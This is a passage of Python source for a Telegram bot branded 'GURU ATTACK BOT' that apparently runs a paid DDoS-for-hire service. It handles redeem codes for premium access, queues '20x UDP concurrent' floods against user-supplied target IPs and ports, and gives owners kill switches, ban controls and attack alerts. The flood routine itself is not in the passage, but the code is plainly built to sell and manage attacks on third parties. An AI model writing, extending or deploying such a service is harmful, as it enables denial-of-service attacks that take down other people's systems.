        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        killed = attack_queue.kill_user_attacks(user_id)
        
        await update.message.reply_text(
            f"🔪 *USER ATTACKS KILLED*\n\n"
            f"✅ {killed} attacks killed for user `{user_id}`",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_kill_user'] = False

# ===== KILL COMMAND =====
async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only Owner/Pseudo Owner can use this command!")
        return
    
    killed = attack_queue.kill_switch()
    
    await update.message.reply_text(
        f"🛑 *KILL SWITCH ACTIVATED*\n\n"
        f"✅ {killed} 20x UDP attacks stopped/killed\n"
        f"📌 Queue cleared\n"
        f"⚡ All attacks stopped successfully!",
        parse_mode='Markdown'
    )

async def owner_queue_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    queue = attack_queue.get_queue_status()
    active = attack_queue.active_attacks
    
    text = "📌 *QUEUE & ACTIVE ATTACKS*\n\n"
    
    if active:
        text += "⚡ *Active Attacks (20x UDP):*\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 {att['target']}:{att['port']} - {remaining}s left (User: {att['user_id']})\n"
        text += "\n"
    else:
        text += "⚡ No active attacks\n\n"
    
    if queue:
        text += "📌 *Queued Attacks (20x UDP):*\n"
        for i, q in enumerate(queue, 1):
            text += f"🔸 {q['target']}:{q['port']} - {q['duration']}s (User: {q['user_id']})\n"
    else:
        text += "📌 Queue is empty"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 *PROMOTE ADMIN*\n\nSend user ID to promote:\n`123456789`\n\nSend /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        username = user.get('username', 'Unknown') if user else 'Unknown'
        
        if db.add_admin(user_id, username, update.effective_user.id):
            await update.message.reply_text(f"✅ User `{user_id}` is now an admin!", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ User is already an admin!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    for admin in admins:
        if admin['user_id'] not in [OWNER_ID, PSEUDO_OWNER_ID]:
            keyboard.append([InlineKeyboardButton(f"❌ {admin['user_id']}", callback_data=f"demote_{admin['user_id']}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    if not keyboard:
        await query.edit_message_text("No admins to demote!")
        return
    
    await query.edit_message_text(
        "👑 *DEMOTE ADMIN*\n\nSelect admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin `{user_id}` demoted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote admin!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`\n\nSend /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        if user_id in [OWNER_ID, PSEUDO_OWNER_ID]:
            await update.message.reply_text("❌ Cannot ban owner or pseudo owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, f"Banned by {update.effective_user.id}", update.effective_user.id)
        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    text = "👑 *ADMIN LIST*\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        text += f"• `{admin['user_id']}` - {level}\n"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

# ===== REDEEM COMMAND =====
async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\n"
            "Send: `/redeem CODE`\n"
            "Example: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You have already used a redeem code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\n"
            f"Code: `{code}`\n"
            f"Duration: {result['access_days']} days\n"
            f"📊 Plan: PREMIUM\n"
            f"⚡ 20x UDP: ENABLED\n\n"
            f"🎉 You now have premium access with 20x UDP!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\n"
            "The code is invalid or already used.",
            parse_mode='Markdown'
        )

# ===== BACK =====
async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("📌 MY QUEUE", callback_data="my_queue")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
    
    if db.is_owner_or_pseudo(user_id):
        keyboard.append([InlineKeyboardButton("👑 OWNER PANEL", callback_data="owner")])
    
    if not is_admin:
        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
    
    await query.edit_message_text(
        f"👋 *WELCOME BACK*",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== ATTACK ALERT =====
async def send_attack_alert(attack_info):
    try:
        admins = db.get_admins()
        user = db.get_user(attack_info['user_id'])
        plan = user.get('plan', 'premium') if user else 'premium'
        
        message = (
            f"⚡ *ATTACK ALERT*\n\n"
            f"👤 User: {attack_info.get('first_name', 'Unknown')}\n"
            f"🆔 ID: `{attack_info['user_id']}`\n"
            f"📊 Plan: {plan.upper()}\n"
            f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
            f"⏱️ Duration: {attack_info['duration']}s\n"
            f"⚡ Attacks: 20x UDP CONCURRENT\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        for admin in admins:
            try:
                global application
                if application:
                    await application.bot.send_message(
                        admin['user_id'],
                        message,
                        parse_mode='Markdown'
                    )
            except:
                pass
    except Exception as e:
        logger.error(f"Alert error: {e}")

# ===== START QUEUE PROCESSOR =====
async def start_queue_processor():
    while True:
        await attack_queue.process_queue()
        await asyncio.sleep(0.5)

# ===== GLOBAL APPLICATION =====
application = None

# ===== RUN BOT =====
def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app
    
    loop.create_task(start_queue_processor())
    
    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("kill", kill_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callbacks - Main
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(my_queue_callback, pattern="^my_queue$"))
    app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Admin
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(process_delete_callback, pattern="^del_"))
    
    # Owner
    app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    app.add_handler(CallbackQueryHandler(owner_kill_switch_callback, pattern="^owner_kill$"))
    app.add_handler(CallbackQueryHandler(owner_kill_user_callback, pattern="^owner_kill_user$"))
    app.add_handler(CallbackQueryHandler(owner_queue_status_callback, pattern="^owner_queue_status$"))
    app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    # Messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_promote))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_kill_user))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started with 20x UDP Concurrent!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("👑 GURU ATTACK BOT")
    print("⚡ 20x UDP CONCURRENT - ALWAYS ENABLED")
    print("💎 PREMIUM ONLY - No Free Plan")
    print("📌 Both Methods: Button + /attack command")
    print("📌 Queue System Enabled")
    print("🛑 Kill Switch Available")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
